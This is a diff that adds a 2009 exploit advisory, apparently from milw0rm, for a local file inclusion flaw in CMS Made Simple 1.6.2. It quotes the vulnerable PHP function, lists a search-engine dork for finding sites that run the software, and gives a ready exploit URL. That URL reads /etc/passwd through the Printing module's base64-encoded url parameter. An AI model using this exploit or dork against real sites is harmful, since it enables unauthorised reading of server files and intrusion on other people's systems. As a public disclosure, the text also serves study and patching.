@@ -1,0 +1,33 @@
+#########################################################################################
+#
+#         [CMS Made Simple <= 1.6.2]
+#
+# Class:     LFI
+# Reported:     29/07/2009
+# Public release: 10/08/2009
+# Remote:    Yes
+# DORK:      "This site is powered by CMS Made Simple version 1."
+# Site:      http://www.cmsmadesimple.org/
+# Download:  http://s3.amazonaws.com/cmsms/downloads/4033/cmsmadesimple-1.6.2-full.tar.gz
+# Author:    R00T[ATI]
+# Contact:   r00t.ati@ihteam.net - http://www.ihteam.net
+##########################################################################################
+
+Vulnerability:
+============================================
+function GetURLContent($url) {
+    $content=file_get_contents($url);
+    return $content;
+  }
+=============================================
+
+Exploit :
+================================================================================
+http://[site]/[cms_path]/modules/Printing/output.php?url=L2V0Yy9wYXNzd2Q=
+================================================================================
+L2V0Yy9wYXNzd2Q= <--- /etc/passwd in base64
+
+
+#ihteam.net - Inclusion Hunter Team 
+
+# milw0rm.com [2009-08-10]
